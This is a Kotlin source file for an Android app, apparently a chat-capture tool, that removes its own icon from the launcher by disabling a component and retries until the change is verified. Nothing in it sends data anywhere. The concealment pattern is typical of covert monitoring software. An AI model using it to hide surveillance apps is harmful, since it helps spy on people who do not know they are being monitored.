package com.chats.capture.utils

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import timber.log.Timber

/**
 * Manages app visibility in launcher and Settings
 */
object AppVisibilityManager {
    
    /**
     * Hide app from launcher (app drawer)
     * App will still be accessible from Settings
     */
    fun hideFromLauncher(context: Context) {
        try {
            // Verify app is installed and we have the right context
            val packageInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            if (packageInfo == null) {
                Timber.w("Package not found, cannot hide from launcher")
                return
            }
            
            val componentName = ComponentName(context.packageName, "com.chats.capture.ui.SettingsLauncherActivity")
            
            // Check current state before changing
            val currentState = context.packageManager.getComponentEnabledSetting(componentName)
            if (currentState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                Timber.d("App already hidden from launcher (state: DISABLED)")
                return
            }
            
            // Force disable the component - try multiple times to ensure it works
            val pm = context.packageManager
            try {
                // First attempt
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Timber.d("App hidden from launcher (attempt 1)")
                
                // Wait and verify
                Thread.sleep(150)
                
                // Verify it worked
                var newState = pm.getComponentEnabledSetting(componentName)
                if (newState != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                    Timber.w("First attempt failed (state: $newState), retrying...")
                    
                    // Retry immediately
                    pm.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    
                    Thread.sleep(150)
                    newState = pm.getComponentEnabledSetting(componentName)
                    
                    if (newState == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                        Timber.d("App hidden from launcher (retry successful)")
                    } else {
                        Timber.w("Retry also failed (state: $newState)")
                    }
                } else {
                    Timber.d("App successfully hidden from launcher (verified)")
                }
            } catch (e: Exception) {
                Timber.e(e, "Error setting component state, trying alternative method")
                // Alternative: Try using application context
                try {
                    val appContext = context.applicationContext
                    val appPm = appContext.packageManager
                    appPm.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    Timber.d("App hidden using application context")
                } catch (e2: Exception) {
                    Timber.e(e2, "Alternative method also failed")
                }
            }
            
            Timber.d("App hidden from launcher successfully")
        } catch (e: SecurityException) {
            Timber.w(e, "Security exception hiding app - may need system permissions")
        } catch (e: Exception) {
            Timber.e(e, "Error hiding app from launcher: ${e.message}")
        }
    }
    
    /**
     * Show app in launcher (for testing/debugging)
     */
    fun showInLauncher(context: Context) {
        try {
            val componentName = ComponentName(context, "com.chats.capture.ui.SettingsLauncherActivity")
            context.packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Timber.d("App shown in launcher")
        } catch (e: Exception) {
            Timber.e(e, "Error showing app in launcher")
        }
    }
    
    /**
     * Check if app is hidden from launcher
     */
    fun isHiddenFromLauncher(context: Context): Boolean {
        return try {
            val componentName = ComponentName(context, "com.chats.capture.ui.SettingsLauncherActivity")
            val state = context.packageManager.getComponentEnabledSetting(componentName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            Timber.e(e, "Error checking launcher visibility")
            false
        }
    }
    
    /**
     * Get intent to open app from Settings
     */
    fun getSettingsIntent(context: Context): android.content.Intent {
        return android.content.Intent(context, com.chats.capture.ui.MainActivity::class.java).apply {
            flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
    }
}
